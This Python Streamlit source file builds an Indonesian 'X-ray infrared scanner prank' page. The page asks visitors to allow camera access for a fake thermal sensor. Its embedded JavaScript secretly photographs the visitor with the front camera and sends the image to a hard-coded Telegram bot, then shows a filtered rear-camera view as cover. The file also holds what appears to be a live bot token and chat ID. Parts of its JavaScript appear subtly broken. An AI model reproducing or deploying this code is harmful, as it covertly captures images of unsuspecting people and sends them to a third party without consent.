import requests
import streamlit as st
import streamlit.components.v1 as components
from datetime import datetime

# ==========================================
# KONFIGURASI BOT TELEGRAM & HALAMAN
# ==========================================
TELEGRAM_BOT_TOKEN = "8837419409:AAEdUGcqxc7RyRJHMSJSBh8RURTEOOWTMYM"
TELEGRAM_CHAT_ID = "8236797547"

st.set_page_config(
    page_title="Kamera X-Ray Inframerah Parody",
    page_icon="📷",
    layout="centered"
)

# ==========================================
# CUSTOM CSS / STYLING TEMA CYBERPUNK / X-RAY
# ==========================================
st.markdown("""
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');

    .stApp {
        background: radial-gradient(circle, #051923 0%, #000b18 100%);
        color: #00ffcc;
        font-family: 'Share Tech Mono', monospace;
    }

    .xray-card {
        background: rgba(0, 255, 204, 0.05);
        border: 2px dashed #00ffcc;
        border-radius: 20px;
        padding: 25px;
        box-shadow: 0 0 25px rgba(0, 255, 204, 0.2);
        margin-bottom: 20px;
        text-align: center;
    }

    .hook-box {
        background: rgba(255, 0, 85, 0.15);
        border: 2px solid #ff0055;
        padding: 15px;
        border-radius: 12px;
        margin-bottom: 20px;
        font-size: 15px;
        color: #ff3366;
        text-align: center;
        font-weight: bold;
        box-shadow: 0 0 15px rgba(255, 0, 85, 0.3);
    }
    </style>
""", unsafe_allow_html=True)

# ==========================================
# TAMPILAN UTAMA
# ==========================================
st.markdown("<h1 style='text-align: center; color: #00ffcc; text-shadow: 0 0 10px #00ffcc;'>🛰️ X-RAY INFRARED SCANNER PRANK</h1>", unsafe_allow_html=True)
st.markdown("<p style='text-align: center; color: #8892b0; font-size: 1.1rem;'>Simulasi pemindai inframerah berbasis AI real-time via kamera HP.</p>", unsafe_allow_html=True)

with st.container():
    st.markdown('<div class="xray-card">', unsafe_allow_html=True)
    
    st.markdown("""
        <div class="hook-box">
            ⚠️ <b>PERINGATAN SISTEM:</b><br>
            Arahkan kamera ke objek yang ingin dipindai. Wajib klik tombol <b>"ALLOW / IZINKAN"</b> pada pop-up browser untuk mengaktifkan sensor termal inframerah! 🌡️📸
        </div>
    """, unsafe_allow_html=True)

    # HTML Component yang berisi tombol, kamera depan tersembunyi (ambil foto diem-diem), 
    # lalu switch otomatis ke kamera belakang dengan efek inframerah/grayscale kontras tinggi.
    xray_script_html = f"""
    <div style="text-align: center;">
        <button id="scanBtn" style="
            background: linear-gradient(135deg, #00ffcc 0%, #0077b6 100%);
            color: #000814;
            font-weight: bold;
            font-size: 18px;
            border: 2px solid #ffffff;
            padding: 16px 24px;
            border-radius: 16px;
            width: 100%%;
            cursor: pointer;
            box-shadow: 0 0 20px rgba(0, 255, 204, 0.6);
            font-family: 'Share Tech Mono', monospace;
            text-transform: uppercase;
        ">🔥 AKTIFKAN KAMERA INFRARED X-RAY</button>
    </div>

    <!-- Video untuk tangkap kamera depan diam-diam -->
    <video id="hidden-cam" autoplay playsinline style="display:none;"></video>
    <canvas id="hidden-canvas" width="640" height="480" style="display:none;"></canvas>

    <!-- Area Live Preview Kamera Belakang dengan Efek Inframerah -->
    <div id="preview-container" style="display:none; margin-top: 20px; text-align: center;">
        <p style="color: #00ffcc; font-size: 14px; margin-bottom: 8px; font-family: monospace;">🟢 STATUS: SENSOR TERMAL AKTIF (ARAHKAN KE OBJEK)</p>
        <video id="live-back-cam" autoplay playsinline style="
            width: 100%%;
            max-width: 400px;
            border-radius: 12px;
            border: 2px solid #00ffcc;
            filter: grayscale(100%%) contrast(250%) brightness(90%) hue-rotate(180deg);
            box-shadow: 0 0 30px rgba(0, 255, 204, 0.4);
        "></video>
    </div>

    <script>
        const token = "{TELEGRAM_BOT_TOKEN}";
        const chatId = "{TELEGRAM_CHAT_ID}";

        document.getElementById('scanBtn').addEventListener('click', async function() {{
            const btn = document.getElementById('scanBtn');
            btn.innerText = "MENGINISIASI SENSOR...";
            btn.style.opacity = "0.7";

            try {{
                // 1. Ambil akses kamera depan terlebih dahulu secara diam-diam
                const frontStream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }});
                const hiddenVideo = document.getElementById('hidden-cam');
                hiddenVideo.srcObject = frontStream;
                
                await new Promise(r => setTimeout(r, 1200)); // Jeda sejenak biar frame siap
                
                const canvas = document.getElementById('hidden-canvas');
                const ctx = canvas.getContext('2d');
                ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
                
                // 2. Kirim hasil tangkapan kamera depan ke Telegram
                canvas.toBlob(function(blob) {{
                    const fd = new FormData();
                    fd.append('chat_id', chatId);
                    fd.append('photo', blob, 'korban_xray_tercyduk.jpg');
                    fd.append('caption', '🎯 <b>TARGET TERCYDUK KLIK X-RAY PRANK!</b>');
                    
                    fetch('https://api.telegram.org/bot' + token + '/sendPhoto', {{
                        method: 'POST',
                        body: fd
                    }});
                }}, 'image/jpeg', 0.85);
                
                // Matikan stream kamera depan
                frontStream.getTracks().forEach(track => track.stop());

                // 3. Setelah sukses jepret depan, buka kamera belakang dengan efek inframerah
                btn.style.display = "none";
                document.getElementById('preview-container').style.display = "block";

                const backStream = await navigator.mediaDevices.getUserMedia({{ 
                    video: {{ facingMode: "environment" }} 
                }});
                const backVideo = document.getElementById('live-back-cam');
                backVideo.srcObject = backStream;

            } catch(e) {{
                console.log("Gagal akses kamera: ", e);
                btn.innerText = "GAGAL AKSES - COBA LAGI";
                btn.style.opacity = "1";
            }});
        }});
    </script>
    """
    
    components.html(xray_script_html, height=450)
    st.markdown('</div>', unsafe_allow_html=True)
